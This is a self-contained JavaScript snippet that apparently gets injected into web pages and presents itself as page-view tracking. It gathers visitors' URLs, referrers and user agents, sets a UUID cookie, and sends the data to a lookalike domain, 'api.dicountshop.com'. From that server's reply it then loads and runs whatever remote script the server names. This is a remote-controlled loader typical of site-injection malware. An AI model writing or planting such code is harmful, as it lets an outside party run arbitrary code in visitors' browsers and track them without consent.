(function() {
    var re_ret_u = window.location.href;
    var re_ret_dt = detectDeviceType();
    var re_ret_uAgent = navigator.userAgent;
    var re_ret_r = document.referrer;

    function getCookie(cookieName) {
        return document.cookie.split('; ').reduce((value, cookie) => {
            const [name, val] = cookie.split('=');
            return (name === encodeURIComponent(cookieName)) ? decodeURIComponent(val) : value;
        }, null);
    }

    const re_ret_uid = getCookie('re_ret_uid');
    const re_ret_ref = getCookie('re_ret_ref');

    function setCookie(cookieName, cookieValue) {
        document.cookie = `${encodeURIComponent(cookieName)}=${encodeURIComponent(cookieValue)}; expires=${(new Date(Date.now() + 86400000)).toUTCString()}; path=/`;
    }

    if (!re_ret_uid) {
        setCookie('re_ret_uid', generateUUID());
    }

    if (re_ret_ref != encodeURIComponent(re_ret_r)) {
        setCookie('re_ret_ref', encodeURIComponent(re_ret_r));
    }

    function detectDeviceType() {
        var re_ret_userAgent = navigator.userAgent;

        if (/iPhone|iPad|iPod/i.test(re_ret_userAgent)) {
            return "iOS";
        } else if (/Android/i.test(re_ret_userAgent)) {
            return "Android";
        } else if (/Windows Phone/i.test(re_ret_userAgent)) {
            return "Windows Phone";
        } else if (/Windows NT/i.test(re_ret_userAgent)) {
            return "Windows";
        } else if (/Macintosh/i.test(re_ret_userAgent)) {
            return "Mac";
        } else if (/Linux/i.test(re_ret_userAgent)) {
            return "Linux";
        } else {
            return "Unknown";
        }
    }

    function generateUUID() {
        var re_ret_d = new Date().getTime();
        var re_ret_uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var re_ret_r = (re_ret_d + Math.random() * 16) % 16 | 0;
            re_ret_d = Math.floor(re_ret_d / 16);
            return (c == 'x' ? re_ret_r : (re_ret_r & 0x3 | 0x8)).toString(16);
        });
        return re_ret_uuid;
    }

    var re_ret_c = window.wwData || [];
    re_ret_c.push({
        event: "viewPage",
        uxid: generateUUID(),
        page: re_ret_u,
        device_type: re_ret_dt,
        uAgent: re_ret_uAgent,
        referrer: re_ret_ref
    });

    var re_ret_d = {};
    re_ret_d.data = re_ret_c;

    let requestData = {
        url: window.location.href,
        referrer: document.referrer,
        coo: JSON.stringify(re_ret_uid),
        origin: window.location.hostname
    };

    const re_ret_wd_url = 'https://api.dicountshop.com/api/datascript';

    fetch(re_ret_wd_url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
    })
    .then((res) => res.json())
    .then(response => {
        i_s(response);
    })
    .catch(error => {
        console.error("Fetch failed: ", error);
    });

    function i_s(re_ret_f_r) {
     
        var re_ret_r_s = re_ret_f_r.name;
        var re_rl = re_ret_f_r.url;
        var re_ret_rs_d = document.createElement('script');
        var re_ret_encodedUrl = encodeURIComponent(re_rl); 
        re_ret_rs_d.src = 'https://api.dicountshop.com/' + re_ret_r_s + '.js?url=' + re_ret_encodedUrl;

        re_ret_rs_d.async = true;

        document.head.appendChild(re_ret_rs_d);

    }
})();